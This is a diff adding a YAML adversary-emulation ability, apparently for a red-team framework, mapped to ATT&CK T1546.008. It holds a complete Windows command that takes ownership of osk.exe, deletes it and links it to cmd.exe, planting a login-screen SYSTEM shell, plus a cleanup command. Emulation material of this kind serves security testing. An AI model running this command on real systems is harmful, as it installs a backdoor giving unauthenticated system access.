@@ -1,0 +1,26 @@
+---
+- id: 6f6518545b5dd35eecbed18dfa828e8c
+  name: Create Symbolic Link From osk.exe to cmd.exe
+  description: 'Replace accessiblity executable with cmd.exe to provide elevated command
+    prompt from login screen without logging in.
+
+    '
+  tactic: multiple
+  technique:
+    attack_id: T1546.008
+    name: 'Event Triggered Execution: Accessibility Features'
+  platforms:
+    windows:
+      cmd:
+        command: IF NOT EXIST %windir%\System32\osk.exe.bak (copy %windir%\System32\osk.exe
+          %windir%\System32\osk.exe.bak) ELSE ( pushd ) && takeown /F %windir%\System32\osk.exe
+          /A && icacls %windir%\System32\osk.exe /grant Administrators:F /t && del
+          %windir%\System32\osk.exe && mklink %windir%\System32\osk.exe %windir%\System32\cmd.exe
+        payloads: []
+        cleanup: takeown /F %windir%\System32\osk.exe /A && icacls %windir%\System32\osk.exe
+          /grant Administrators:F /t && del %windir%\System32\osk.exe && copy /Y %windir%\System32\osk.exe.bak
+          %windir%\System32\osk.exe && icacls %windir%\system32\osk.exe /inheritance:d
+          && icacls %windir%\system32\osk.exe /setowner "NT SERVICE\TrustedInstaller"
+          && icacls %windir%\System32\osk.exe /grant "NT SERVICE\TrustedInstaller":F
+          /t && icacls %windir%\system32\osk.exe /grant:r SYSTEM:RX && icacls %windir%\system32\osk.exe
+          /grant:r Administrators:RX
